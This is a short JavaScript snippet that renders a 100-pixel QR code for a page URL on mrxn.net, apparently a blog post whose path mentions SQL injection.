var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ProductInfoJF-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 